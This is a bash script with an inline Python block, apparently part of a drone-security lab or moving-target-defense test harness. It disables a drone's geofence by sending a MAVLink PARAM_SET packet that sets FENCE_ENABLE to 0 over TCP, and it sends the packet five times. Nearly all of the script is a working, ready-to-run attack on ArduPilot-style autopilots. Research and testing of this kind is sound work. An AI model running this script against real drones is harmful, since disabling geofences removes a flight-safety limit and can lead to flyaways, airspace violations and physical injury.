#!/usr/bin/env bash
# Auto-generated from: Geofencing-Attack.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# 파라미터 설정은 보통 MAVLink TCP 포트 5760을 통해 이루어집니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
  DRONE_MAVLINK_TCP)
    TARGET_PORT="${TARGET_PORT:-5760}" # 기본 MAVLink TCP 포트
    ;;
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 일반 MAVLink UDP 포트 (예비)
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=geofencing-attack src=Geofencing-Attack.md"
log "[BLOCK 1] type=python (Inline Geofence Disable Attack)"

# MAVLink 파라미터 설정을 이용해 지오펜싱을 비활성화하는 Python 인라인 스크립트 실행
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os, sys
import time
import socket
from pymavlink import mavutil

# 인수가 누락되었을 경우 환경 변수 fallback
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

# 인수를 IP, Port로 파싱
try:
    target_ip, target_port_str = sys.argv[1].split(':')
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)


def set_param(mav, param_id, param_value, param_type):
    """MAVLink PARAM_SET 메시지를 인코딩합니다."""
    # param_id는 16바이트로 패딩되어야 합니다.
    param_id_padded = param_id.encode('utf-8')[:16].ljust(16, b'\x00')
    return mav.param_set_encode(
        target_system=mav.target_system,
        target_component=mav.target_component,
        param_id=param_id_padded,
        param_value=param_value,
        param_type=param_type
    ).pack(mav)

def send_mavlink_packet_tcp(packet_data, target_ip, target_port):
    """TCP를 통해 MAVLink 패킷을 전송합니다."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.sendall(packet_data)
    sock.close()

def main(target_ip, target_port):
    # MAVLink 명령 구조 설정을 위한 임시 MAVLink 객체
    mav = mavutil.mavlink.MAVLink(None)
    # 공격 대상 시스템 및 컴포넌트 ID (일반적으로 1)
    mav.target_system = 1
    mav.target_component = 1

    # 공격 액션: 지오펜싱 비활성화 (FENCE_ENABLE=0)
    PARAM_ID = 'FENCE_ENABLE'
    PARAM_VALUE = 0.0 # 0.0은 비활성화를 의미 (UINT8 타입)
    PARAM_TYPE = mavutil.mavlink.MAV_PARAM_TYPE_UINT8
    
    packet = set_param(mav, PARAM_ID, PARAM_VALUE, PARAM_TYPE)

    print(f"[INFO] Attempting to set parameter '{PARAM_ID}' to {PARAM_VALUE} via TCP to {target_ip}:{target_port}.")

    # 안정적인 공격을 위해 여러 번 전송
    for i in range(5):
        try:
            send_mavlink_packet_tcp(packet, target_ip, target_port)
            time.sleep(0.1)
        except ConnectionRefusedError:
            print(f"[ERROR] Connection refused to {target_ip}:{target_port}. Check MAVLink TCP bridge.", file=sys.stderr)
            sys.exit(1)
        except Exception as e:
            print(f"[ERROR] An unexpected error occurred during packet send attempt {i+1}: {e}", file=sys.stderr)
            sys.exit(1)

    print(f"[INFO] Sent geofence disable command 5 times. Attack complete.")


if __name__ == "__main__":
    main(target_ip, target_port)
PY

log "[BLOCK 2] type=control (Execution Complete)"
log "Parameter injection attack finished execution."